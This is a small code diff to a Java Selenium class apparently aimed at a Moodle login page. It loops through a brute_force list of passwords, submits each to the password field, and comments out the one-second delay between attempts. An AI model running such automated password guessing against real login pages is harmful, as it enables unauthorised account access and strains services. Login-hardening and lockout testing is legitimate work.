@@ -76,7 +76,7 @@ public class Moodle {
        for (int i = 0; i < brute_force.length; i++) {
           driver.findElement(By.id("password")).sendKeys(brute_force[i]);
           driver.findElement(By.id("password")).sendKeys(Keys.ENTER);
-          Thread.sleep(1000);
+         // Thread.sleep(1000);
        }
     }
 }
